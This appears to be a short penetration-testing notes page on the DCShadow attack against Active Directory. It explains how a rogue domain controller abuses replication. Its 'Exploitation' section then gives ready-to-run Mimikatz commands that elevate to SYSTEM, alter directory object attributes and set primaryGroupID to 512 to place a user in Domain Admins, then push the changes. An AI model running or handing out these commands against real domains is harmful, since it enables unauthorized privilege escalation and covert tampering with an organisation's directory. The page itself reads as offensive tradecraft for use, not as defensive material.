# DCShadow

{% embed url="https://www.dcshadow.com" %}

{% embed url="https://pentestlab.blog/2018/04/16/dcshadow" %}

#### A DCShadow attack on Active Directory is an attack designed to change directory objects using malicious replication. During this attack, DCShadow impersonates a Domain Controller using administrative rights and starts a replication process, so that changes made on one Domain Controller are synchronized with other Domain Controllers. DCShadow abuses the Directory Replication Service (DRS) Remote Protocol \[MS-DRSR] and Active Directory Technical specification \[MS-ADTS].

![](<../../../.gitbook/assets/image (19).png>)

### <mark style="color:orange;">Exploitation</mark>

Start Mimikatz, running as an account that is part of Domain Admins or Enterprise Admins:

```
mimikatz # !+
# This will start the mimikatz service (mimidrv) if it’s not running.
mimikatz # !processtoken
# This will elevate mimikatz process to system privilege.
mimikatz # lsadump::dcshadow /object: CN=[replace],OU=[with],DC=[your],DC=[AD object] /attribute: description /value: “DCShadow was here”
# This command will start the RPC server and it will modify the object of this user’s description value once it’s been pushed.
# Another interesting part is adding a user to domain admins group:
mimikatz # lsadump::dcshadow /object: CN=[replace],OU=[with],DC=[your],DC=[AD object] /attribute: primaryGroupID /value: 512
```

Now start another mimikatz process (leave the other window open) and push the object changes:

```
mimikatz # lsadump::dcshadow /push
# This command will push the object and sync with the domain.
```
